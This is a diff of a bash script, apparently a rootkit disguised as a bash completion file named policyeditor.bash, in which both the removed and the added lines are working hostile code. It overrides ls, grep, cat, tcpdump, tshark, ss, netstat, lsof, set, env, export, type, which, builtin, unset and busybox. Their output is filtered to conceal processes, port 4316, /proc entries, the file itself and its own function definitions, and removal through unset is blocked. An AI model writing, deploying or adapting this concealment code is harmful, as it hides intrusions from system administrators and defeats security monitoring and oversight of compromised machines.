@@ -1,120 +1,147 @@
-command export _HG_P="grep|head|tail|strace|__vte|4316|127.0.0.1|/proc/|hidepid|eval|bash_|mount|ps|pstree|type|set|cat|less|tcpdump|lsof|findmnt|ls|find|alias|declare|which|typeset|env|printenv|export|unset|pgrep|pkill|top|htop|tr|sed|awk|policyeditor|_HG_P"
-/usr/bin/unalias ls ps pgrep top grep htop tcpdump lsof cat type which mount findmnt alias env printenv set export unset head tail strace 2>/dev/null
+command export _HG_P="grep|head|tail|strace|ps|__vte|4316|/proc/|hidepid|eval|bash_|mount|set|cat|tcpdump|tshark|lsof|findmnt|ls|alias|declare|which|typeset|env|printenv|export|unset|busybox|policyeditor|_HG_P"
+unalias ls grep tcpdump tshark lsof cat type which mount findmnt alias env printenv set export declare typeset unset head tail which strace ss busybox netstat 2>/dev/null
+function which { 
+    [[ -n "$COMP_LINE" ]] && { command $(which which) "$@"; return; }
+    for a in "$@"; do 
+        [[ "$a" == -* ]] && continue
+        command $(which which) -a "$a" 2>/dev/null | command /usr/bin/head -n 1
+    done 
+}
+_filter_output() { command $(which grep) --line-buffered -Ev "$_HG_P"; }
+function grep { [[ -n "$COMP_LINE" ]] && { command $(which grep) "$@"; return; }; command $(which grep) "$@" | _filter_output; }
+function head { [[ -n "$COMP_LINE" ]] && { command $(which head) "$@"; return; }; command $(which head) "$@" | _filter_output; }
+function tail { [[ -n "$COMP_LINE" ]] && { command $(which tail) "$@"; return; }; command $(which tail) "$@" | _filter_output; }
+function cat { [[ -n "$COMP_LINE" ]] && { command $(which cat) "$@"; return; }; command $(which cat) "$@" 2>/dev/null | _filter_output; }
+function strace { [[ -n "$COMP_LINE" ]] && { command $(which strace) "$@"; return; }; command $(which strace) "$@" 2>&1 | _filter_output; }
+function lsof { [[ -n "$COMP_LINE" ]] && { command $(which lsof) "$@"; return; }; command $(which lsof) "$@" | _filter_output; }
+function mount { [[ -n "$COMP_LINE" ]] && { command $(which mount) "$@"; return; }; command $(which mount) "$@" | command $(which grep) -vE "/proc|/dev/shm"; }
+function findmnt { [[ -n "$COMP_LINE" ]] && { command $(which findmnt) "$@"; return; }; command $(which findmnt) "$@" | command $(which grep) -vE "/proc|/dev/shm"; }
+function netstat { [[ -n "$COMP_LINE" ]] && { command $(which netstat) "$@"; return; }; command $(which netstat) "$@" | _filter_output; }
+function ss { [[ -n "$COMP_LINE" ]] && { command $(which ss) "$@"; return; }; command $(which ss) "$@" | _filter_output; }
+tcpdump() {
+    [[ -n "$COMP_LINE" ]] && { command $(which tcpdump) "$@"; return; }
+    local f="not port 4316"
+    if [ $# -eq 0 ]; then
+        command $(which tcpdump) -i any $f 2>/dev/null
+    else 
+        local p=$( [[ "$*" =~ (tcp|port|host|udp|ip) ]] && $(which echo) "and " )
+        command $(which tcpdump) "$@" $p$f 2>/dev/null
+    fi
+}
+tshark() { 
+    [[ -n "$COMP_LINE" ]] && { command $(which tshark) -l "$@"; return; }
+    command $(which tshark) -l "$@" -f "not port 4316" 2>/dev/null
+}
+function ls {
+    [[ -n "$COMP_LINE" ]] && { command $(which ls) "$@"; return; }
+    local p="($_HG_P)"
+    if [[ "$*" == *"/proc"* ]] || [[ "$PWD" == "/proc" ]]; then
+        local empty_dirs=$(command $(which find) /proc -maxdepth 1 -type d -empty -name "[0-9]*" -printf "-I %f ")
+        command $(which ls) $empty_dirs -I "$p" -I "policyeditor.bash" "$@"
+    else
+        command $(which ls) -I "$p" -I "policyeditor.bash" "$@"
+    fi
+}
+function busybox {
+    if ! command $(which busybox) &>/dev/null; then
+        command $(which echo) "busybox: command not found" >&2
+        return 127
+    fi
+    [[ $# -eq 0 ]] && { command busybox; return; }
+    local subcmd="$1"
+    shift
+    local -a wrapped=(grep head tail cat strace lsof ls mount findmnt
+                      tcpdump tshark ss netstat which env printenv
+                      set export declare typeset unset type)
+    for w in "${wrapped[@]}"; do
+        if [[ "$subcmd" == "$w" ]]; then
+            "$subcmd" "$@"
+            return
+        fi
+    done
+    command busybox "$subcmd" "$@"
+}
+for cmd in grep head tail cat strace tcpdump tshark lsof ls ps mount findmnt netstat ss busybox; do
+    path=$(which $cmd)
+    if [[ -n "$path" && "$path" == /* ]]; then
+        eval "function $path { $cmd \"\$@\"; }"
+    fi
+done
+_HIDDEN_FUNC_PATTERN="(grep|head|ps|tail|builtin|strace|type|set|typeset|declare|export|ls|cat|tcpdump|tshark|lsof|mount|findmnt|which|env|printenv|unset|ss|netstat|busybox|_filter_output|_HIDDEN_FUNC_PATTERN|\/usr\/bin|\/usr\/sbin|\/bin\/)"
 set() {
     if [[ -n "$COMP_LINE" ]]; then command builtin set "$@"; return; fi
-    command builtin set "$@" | /usr/bin/awk '
-        /^(grep|head|tail|strace|type|pstree|set|ps|typeset|declare|export|ls|cat|tcpdump|lsof|mount|findmnt|pgrep|top|htop|which|alias|env|printenv|unset) \(\)/ { skip=1 }
+    command builtin set "$@" | /usr/bin/awk -v pat="$_HIDDEN_FUNC_PATTERN" '
+        $0 ~ "^" pat " \\(\\)" { skip=1 }
+        $0 ~ "^(_HG_P|_HIDDEN_FUNC_PATTERN)=" { next }
         skip && /^\}/ { skip=0; next }
         !skip
     '
 }
 declare() {
     if [[ -n "$COMP_LINE" ]]; then command builtin declare "$@"; return; fi
-    command builtin declare "$@" | /usr/bin/awk '
-        /^declare -[a-zA-Z]* (grep|head|tail|strace|type|pstree|set|ps|typeset|declare|export|ls|cat|tcpdump|lsof|mount|findmnt|pgrep|top|htop|which|alias|env|printenv|unset)$/ { next }
-        /^(grep|head|tail|strace|type|pstree|set|ps|typeset|declare|export|ls|cat|tcpdump|lsof|mount|findmnt|pgrep|top|htop|which|alias|env|printenv|unset) \(\)/ { skip=1 }
+    command builtin declare "$@" | /usr/bin/awk -v pat="$_HIDDEN_FUNC_PATTERN" '
+        $0 ~ "^declare -[a-zA-Z-]* (" pat "|_HG_P|_HIDDEN_FUNC_PATTERN)(=|$)" { next }
+        $0 ~ "^" pat " \\(\\)" { skip=1 }
+        $0 ~ "^(_HG_P|_HIDDEN_FUNC_PATTERN)=" { next }
         skip && /^\}/ { skip=0; next }
         !skip
     '
 }
 typeset() {
     if [[ -n "$COMP_LINE" ]]; then command builtin typeset "$@"; return; fi
-    command builtin typeset "$@" | /usr/bin/awk '
-        /^(grep|head|tail|strace|type|pstree|set|ps|typeset|declare|export|ls|cat|tcpdump|lsof|mount|findmnt|pgrep|top|htop|which|alias|env|printenv|unset) \(\)/ { skip=1 }
+    command builtin typeset "$@" | /usr/bin/awk -v pat="$_HIDDEN_FUNC_PATTERN" '
+        $0 ~ "^" pat " \\(\\)" { skip=1 }
+        $0 ~ "^(_HG_P|_HIDDEN_FUNC_PATTERN)=" { next }
         skip && /^\}/ { skip=0; next }
         !skip
     '
 }
-export() {
+env() {
+    if [[ -n "$COMP_LINE" ]]; then command /usr/bin/printenv "$@"; return; fi
+    command /usr/bin/printenv "$@" | /usr/bin/awk -v pat="$_HIDDEN_FUNC_PATTERN" '
+        $0 ~ "^BASH_FUNC_" pat { skip=1 }
+        /^(_HG_P=|_HIDDEN_FUNC_PATTERN=|_=)/ { next }
+        skip && /^\}/ { skip=0; next }
+        !skip
+    ' 2>/dev/null
+}
+printenv() { env "$@"; }
+function export {
     if [[ -n "$COMP_LINE" ]]; then command builtin export "$@"; return; fi
-    if [[ "$1" == "-f" ]]; then
-        /usr/bin/echo "bash: export: -f: invalid option"
-        /usr/bin/echo "export: usage: export [-pn] [name[=value] ...] or export -p"
-        return 1
+    if [[ "$*" =~ -[a-z]*f ]]; then
+        command builtin export "$@" | /usr/bin/awk -v pat="$_HIDDEN_FUNC_PATTERN" '
+            $0 ~ "^declare -[a-z]* " pat { next }
+            $0 ~ "^" pat " ?\\(\\)" { skip=1; next }
+            skip && /^\}/ { skip=0; next }
+            !skip
+        ' 2>/dev/null
     elif [[ $# -eq 0 || "$1" == "-p" ]]; then
-        command export "$@" | /usr/bin/grep -v "_HG_P="
+        command builtin export "$@" | command /usr/bin/grep -vE "_HG_P=|_HIDDEN_FUNC_PATTERN=|_filter_output="
     else
         command builtin export "$@"
     fi
 }
-grep() { [[ -n "$COMP_LINE" ]] && { /usr/bin/grep "$@"; return; }; /usr/bin/grep "$@" | /usr/bin/grep -Ev "$_HG_P"; }
-head() { [[ -n "$COMP_LINE" ]] && { /usr/bin/head "$@"; return; }; /usr/bin/head "$@" | /usr/bin/grep -Ev "$_HG_P"; }
-tail() { [[ -n "$COMP_LINE" ]] && { /usr/bin/tail "$@"; return; }; /usr/bin/tail "$@" | /usr/bin/grep -Ev "$_HG_P"; }
-strace() { [[ -n "$COMP_LINE" ]] && { /bin/strace "$@"; return; }; /bin/strace "$@" | /usr/bin/grep -Ev "$_HG_P"; }
-tcpdump() {
-    [[ -n "$COMP_LINE" ]] && { /usr/sbin/tcpdump "$@"; return; }
-    local f="not port 4316 and not host 127.0.0.1"
-    if [ $# -eq 0 ]; then /usr/sbin/tcpdump -i any $f 2>/dev/null
-    else 
-        local p=$( [[ "$*" == *tcp* || "$*" == *port* || "$*" == *host* ]] && /usr/bin/echo "and " )
-        /usr/sbin/tcpdump "$@ $p$f" 2>/dev/null
-    fi
-}
-lsof() { [[ -n "$COMP_LINE" ]] && { /usr/sbin/lsof "$@"; return; }; /usr/bin/lsof "$@" | /usr/bin/grep -Ev "$_HG_P"; }
-ls() {                                                                                                                                                                                                                                                                                                  
-    [[ -n "$COMP_LINE" ]] && { /usr/bin/ls "$@"; return; }                                                                                                                                                                                                                                              
-    local p="($_HG_P)"                                                                                                                                                                                                                                                                                  
-    local hidden_file="policyeditor.bash"                                                                                                                                                                                                                                                               
-                                                                                                                                                                                                                                                                                                        
-    if [[ "$*" == *"/proc"* ]] || [[ "$PWD" == "/proc" ]]; then
-        local empty_dirs=$(/usr/bin/find /proc -maxdepth 1 -type d -empty -name "[0-9]*" -printf "-I %f ")
-        /usr/bin/ls $empty_dirs -I "$p" -I "$hidden_file" "$@"                                                                                                                                                                                                                                          
-    else
-        /usr/bin/ls -I "$p" -I "$hidden_file" "$@"
-    fi
-}
-/usr/bin/alias ls='ls --color=auto'
-cat() { [[ -n "$COMP_LINE" ]] && { /usr/bin/cat "$@"; return; }; /usr/bin/cat "$@" 2>/dev/null | /usr/bin/grep -Ev "$_HG_P"; }
-mount() { [[ -n "$COMP_LINE" ]] && { /usr/bin/mount "$@"; return; }; /usr/bin/mount "$@" | /usr/bin/grep -vE "/proc|/dev/shm"; }
-findmnt() { [[ -n "$COMP_LINE" ]] && { /usr/bin/findmnt "$@"; return; }; /usr/bin/findmnt "$@" | /usr/bin/grep -vE "/proc|/dev/shm"; }
-type() { 
+function type { 
     [[ -n "$COMP_LINE" ]] && { command builtin type "$@"; return; }
     for a in "$@"; do 
         case "$a" in 
-            grep|head|tail|strace|ps|pstree|mount|findmnt|tcpdump|lsof|ls|find|which|cat|less|top|htop|pgrep|pkill) /usr/bin/echo "$a is /usr/bin/$a" ;; 
-            type|set|alias|declare|unset|typeset|env|printenv|export) /usr/bin/echo "$a is a shell builtin" ;; 
+            grep|which|head|tail|strace|ps|mount|findmnt|tcpdump|tshark|lsof|ls|cat|ss|busybox|netstat) command /usr/bin/echo "$a is $(which $a)" ;; 
+            type|set|alias|declare|unset|typeset|env|printenv|export) command /usr/bin/echo "$a is a shell builtin" ;; 
             *) command builtin type "$a" 2>/dev/null ;; 
         esac
     done 
 }
-which() { 
-    [[ -n "$COMP_LINE" ]] && { /usr/bin/which "$@"; return; }
-    for a in "$@"; do 
-        case "$a" in 
-            grep|head|tail|strace|ps|pstree|mount|findmnt|tcpdump|lsof|ls|find|cat|less|top|htop|pgrep|pkill) /usr/bin/echo "/usr/bin/$a" ;; 
-            *) /usr/bin/which "$a" 2>/dev/null ;; 
-        esac
-    done 
+function builtin {
+    if [[ "$1" == "unset" && "$*" =~ ($_HIDDEN_FUNC_PATTERN) ]]; then return; fi
+    case "$1" in 
+        grep|head|tail|strace|ps|ls|tcpdump|tshark|busybox|lsof|cat|mount|findmnt|type|which|env|printenv|set|ss|netstat|export|declare|typeset|alias|unset)
+            "$@" ;;
+        *) command builtin builtin "$@" ;;
+    esac
 }
-env() {
-    [[ -n "$COMP_LINE" ]] && { /usr/bin/printenv "$@"; return; }
-    /usr/bin/printenv "$@" | /usr/bin/awk '
-        /^BASH_FUNC_(grep|head|tail|strace|type|pstree|set|ps|typeset|declare|export|ls|cat|tcpdump|lsof|mount|findmnt|pgrep|top|htop|which|alias|env|printenv|unset)/ { skip=1 }
-        /^(_HG_P=|_=)/ { next }
-        skip && /^\}/ { skip=0; next }
-        !skip
-    '
-}
-printenv() {
-    [[ -n "$COMP_LINE" ]] && { /usr/bin/printenv "$@"; return; }
-    /usr/bin/printenv "$@" | /usr/bin/awk '
-        /^BASH_FUNC_(grep|head|tail|strace|type|pstree|set|ps|typeset|declare|export|ls|cat|tcpdump|lsof|mount|findmnt|pgrep|top|htop|which|alias|env|printenv|unset)/ { skip=1 }
-        /^(_HG_P=|_=)/ { next }
-        skip && /^\}/ { skip=0; next }
-        !skip
-    '
-}
-builtin() {
-    command builtin builtin "$@"
-    if [[ -z "$COMP_LINE" ]]; then
-        [[ -f "/etc/bash_completion.d/policyeditor.bash" ]] && . /etc/bash_completion.d/policyeditor.bash &>/dev/null
-    fi
-}
-unset() {
+function unset {
+    if [[ "$*" =~ ($_HIDDEN_FUNC_PATTERN) ]]; then return; fi
     command builtin unset "$@"
-    if [[ -z "$COMP_LINE" ]]; then
-        [[ -f "/etc/bash_completion.d/policyeditor.bash" ]] && . /etc/bash_completion.d/policyeditor.bash &>/dev/null
-    fi
 }
-command builtin export -f grep head tail strace ls ps pgrep tcpdump lsof cat mount findmnt type which env printenv set export declare typeset alias unset &>/dev/null
-command builtin unset PROMPT_COMMAND
+alias ls='ls --color=auto'
+command builtin export -f grep head tail strace ps ls tcpdump tshark lsof cat mount findmnt ss netstat busybox _filter_output &>/dev/null
